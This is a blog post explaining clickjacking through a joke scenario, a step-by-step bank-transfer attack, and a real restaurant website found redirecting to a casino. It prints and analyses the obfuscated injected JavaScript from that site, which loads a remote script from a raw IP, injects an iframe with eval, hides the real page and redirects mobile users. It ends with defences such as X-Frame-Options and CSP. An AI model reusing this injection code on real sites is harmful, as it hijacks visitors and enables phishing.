---
path: "/clickjacking-using-iframes-a-case-study"
date: "2020-07-12T16:18:32.278Z"
title: "Clickjacking Using Iframes: A Case Study"
description: "I just wanted some food, but it led me to write this blog post."
image: './blank.jpg'
tags: ['security','clickjacking','exploit','javascript']
---

## What is it?

Having been around since 2002, Clickjacking or "UI redressing" is a technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent. In turn, the content rendered in these frames could lead to malicious content on another page (masking as a legitimate download site, banking site, etc.) Typically, these attacks are carried out by those who own the domain and set up a website for malicious purposes. The other way that this type of attack can work is if an attacker takes over an expired domain or the hacker somehow accesses your web hosting account, CMS, etc. (if this happens, you may want to consider changing your credentials for every account you own).

## An Example

Sounds a bit confusing? Let's use a simple example. You want to download an unreleased version of *The Room 2*, the sequel to Tommy Wiseau's masterpiece from 2003. You know of a way to get the movie from a *safe* and *legitimate* website in a *totally legal 100%* way on [http://totallylegitsafemoviedownload.com](http://totallylegitsafemoviedownload.com/). Now you must be thinking, there shouldn't be any issues given that the word "safe" is in the name. It probably uses ad revenue to plant trees around the world ravaged by illegal deforestation and totally does not track and store your information to later resell it for profit. Given these assumptions, you reassure yourself it'll all be ok to click the big green flashing DOWNLOAD NOW button because nothing screams free movie plus a side of adware more than this.

Little did you know there was a transparent overlaid iframe on top of that button that takes you to a **fake page**.

![Ruse](https://i.kym-cdn.com/photos/images/original/000/692/118/2db.jpg)

A new tab opens and at this point, the only thing separating you and quality entertainment is a single spinner in the middle of the page with a message at the top saying, "Preparing your super fast 1000 TB/s download from our 100% uptime hosts..."

![Yes Spongebob GIF - Yes Spongebob Plankton GIFs](https://media1.tenor.com/images/2676bbb3b2f48a87d7f90aaf8390a8f9/tenor.gif?itemid=10466614)

But wait! A modal pops up. It reads, "Puppies around the world are in dire need of treats. Your donation can help feed millions of treat deprived puppies year-round."

Being the benevolent netizen you are, you enter your name, address, phone number, credit card number, an amount of $10, social security number, biggest fear, and your SAT math score because who else will think of the puppies. You think to yourself: I did a good today.

The modal exits and the spinner disappears. A blank screen of mockery lies before you. You think maybe it will reappear after a few seconds. It doesn't. Ok, maybe a few minutes. It still doesn't. Shit.

Even though this is a very extreme case of falling for a clickjacking attack, the overall idea of how it works remains the same in pretty much all cases. However this technique has morphed into other subcategories that include **likejacking** (for you social media addicts), **nested** (Google+ targeted), **cursorjacking**, **mousejacking**, **browserless**, **cookiejacking**, **filejacking**, and **password manager attacks** (takes advantage of the fact that your password manager auto-fills forms for you).

## Real Life Encounter

While browsing Google Maps for restaurants, I stumbled across a dim sum place I've never tried before. On the left panel, Google Maps listed the usual information -- name, address, website, etc. Since I usually check every website for a menu, I opened the link.

I thought to myself, this had to be the strangest website I've ever seen. Rather than being greeted with maybe a slightly outdated design with a carousel of food pictures, instead, I was assaulted with a plethora of flashing banners, promises of riches, and poor color choices. This was not a dim sum website -- this was an online Chinese casino.

For cases like these, it is very easy to tell since the content you see is drastically different than what you were expecting. Most people would be able to pick up this difference and safely navigate away from the page. However, clickjacking comes in much more nefarious flavors where iframes are carefully placed across pages to make you believe that the action you are performing is for the site you are on and not some shady page.

## How It Works

Despite showing the address of the page you expect, you can tell that the page loaded is completely different for this example. However, this tactic can be quite effective for phishing the average internet user when done correctly -- given that the phishing page is made convincing enough.

I did some experimentation to see if this exploit worked on both HTTP and HTTPS -- which it does. The one thing I discovered that stops this from being an effective attack vector is the use of `X-Frame-Options`.

### X-Frame-Options

`X-Frame-Options` is an HTTP response header or security header that dictates if the request page in the iframe is allowed to be loaded. It applies to any HTML element that can display content from some other sites, such as `<frame>`, `<iframe>`, `<embed>`, and `<object>` to prevent clickjacking attacks from happening.

This header can be set with 3 different values:

- `DENY` - the page can never be loaded in an iframe.
- `SAMEORIGIN` - the page can only load in an iframe as long as the host page is in the same origin.
- `ALLOW-FROM <uri>` - this no longer works and this is **bad**. Don't ever use it. It is only here to support older browsers. This is why we cannot have nice things.

Given the first two options, this means that your local script kiddie can't scam others online with an iframe displaying the Paypal "donate" button with the form prefilled with $1000. Let me explain how this sophisticated hacker can launch the attack:

1. Some Fortnite player, Alice, is bored and wants to get some kick out of scamming other players. They decide to use their script-kiddie skills to whip up a convincing-looking website that promises players rare skins for **free**. For this example, our victim is named Bob.
2. Alice knows that some bank does not use `X-Frame-Options` to protect their website, which means that this will be the target audience for the attack.
3. In the background, a script is executed to check if Bob is logged into the bank that the attacker is targeting. If so, an invisible iframe is loaded up prefilled with a corresponding transfer amount. The iframe is positioned in such a way that the  "Confirm Transfer" button is super-imposed on the "Download" button for each skin.
4. Bob opens the site and selects a skin. The skin is shown on a page with a big green flashing download button in the center. Bob clicks on it thinking he'll be the coolest player out of his friend group, not knowing he made a huge mistake.
5. The bank page proceeds to process the transaction while Bob ends up downloading a text file containing some bull sh*t instructions on how he can redeem the skin with a fake product code.

### The Code

So Stan, where's the code? Glad you asked.

The execution of this attack is slightly different than the previous approaches I've mentioned. In short, what the script does is hide all the contents of the legitimate version of the website and creates an iframe showing the Chinese online casino page. Now, this is quite obvious to anyone that this website has nothing to do with this casino. However, this technique could be used to superimpose a realistic-looking page acting as the website (this can be done if the owner's account for the hosting company was compromised and an attacker set up the clickjacking attack to lure people into handing over money).

When I opened the source code of the page, it was just normal looking Bootstrap templates with a couple of red flags. Other than some other weird JS being executed, I isolated the snippet of code where the clickjacking script lives:

```html
<!DOCTYPE html>
<html lang="en">
  <head>

    <title>Title Page</title><meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

    <meta name="description" content="" />
    <meta name="author" content="">

    <!-- Some 百度 Analytics Code -->
    <script>(function(){var bp=document.createElement("script");var curProtocol=window.location.protocol.split(":")[0];if(curProtocol==="https"){bp.src="https://zz.bdstatic.com/linksubmit/push.js"}else{bp.src="http://push.zhanzhang.baidu.com/push.js"}var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(bp,s)})();</script>
    <script type="text/javascript" src="http://123.123.123.123/script.js"></script> <!-- What is this? -->
  </head>

  <body>
  <!-- Content -->
  </body>
</html>
```

Strange. A script tag referencing code that lives in some random IP address with HTTP connections. LGTM 👍.

```js
/* Some more Baidu Analytics code to track your activity */
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?12345";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "http://www.maliciouspage.com"
    } else {
        var ss = '<center id="importantDiv"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="108' + '88" src="http://www.maliciouspage.com"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "importantDiv") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
```

Notice how some of the JavaScript that is shown above is obfuscated to escape detection. The first portion of the code is just a classic analytics code sent to Baidu. The second part with the `goPAGE()` function is the meat of the exploit.

It first checks if you are using a mobile device and redirects you directly to the website if you are.

```js
if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "http://www.maliciouspage.com"
}
```

Otherwise, the iframe is injected into the page directly by calling the `eval()` function. The code it evaluates is broken up in such a way to avoid any detection. However, it is quite easy to spot just by looking at it.

```js
var ss = '<center id="importantDiv"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="108' + '88" src="http://www.maliciouspage.com"></iframe></center>';
eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
```

Finally, an interval function is executed to hide all elements except the iframe every 100ms.

```js
try {
  setInterval(function() {
    try {
      document.getElementById("div" + "All").style.display = "no" + "ne"
    } catch (e) {}
    for (var i = 0; i < document.body.children.length; i++) {
      try {
        var tagname = document.body.children[i].tagName;
        var myid = document.body.children[i].id;
        if (myid != "iconDiv1" && myid != "importantDiv") {
          document.body.children[i].style.display = "non" + "e"
        }
      } catch (e) {}
    }
  }, 100)
} catch (e) {}
```

On the surface, this attack doesn't seem too complicated to understand. However, it can be used mislead users to hand over sensitive information in a legitimate-looking website. Also, this can be especially lethal when the website loaded in the iframe uses HTTP (which only works if the parent page is also HTTP).

I created a quick [example](https://codepen.io/spiderpig86/pen/JjGBbXQ) on Codepen to demonstrate how it works. In this example, a "malicious" sign up page is presented to you after loading some websites requiring social media credentials.

## Conclusion/Prevention

In short, Clickjacking is a commonly used tactic attackers use to mislead users into performing actions they are not aware of. Now, this attack doesn't use sophisticated tactics to break into some system, however, it is still quite effective along with other tactics that involve the human condition, such as phishing.

![Hackerman](https://github.com/Spiderpig86/blog/blob/master/images/Clickjacking%20Using%20Iframes%20A%20Case%20Study/What_people_think_programming_is_vs._how_it_actually_is.gif?raw=true)

For any website maintainer, a couple of ways to defend against this attack is:

1. Set the correct `X-Frame-Options` to disallow any access to your page from other domains. For a more up to date solution, use a Content Security Policy (CSP) to disallow any frame to load content from other domains of origin.
2. Ensure that the main page itself is always the top-level frame.

As for users, it is always important to remain vigilant for any dodgy offers of money, hot singles in your area, and ads for cheap treatments that doctors ABSOLUTELY hate.

## References

* Wikipedia contributors. "Clickjacking." *Wikipedia, The Free Encyclopedia*. Wikipedia, The Free Encyclopedia, 21 Jun. 2020. Web. 12 Jul. 2020.
* “Clickjacking.” *OWASP*, owasp.org/www-community/attacks/Clickjacking.
* “The Clickjacking Attack.” *The Modern JavaScript Tutorial*, 29 June 2019, javascript.info/clickjacking.
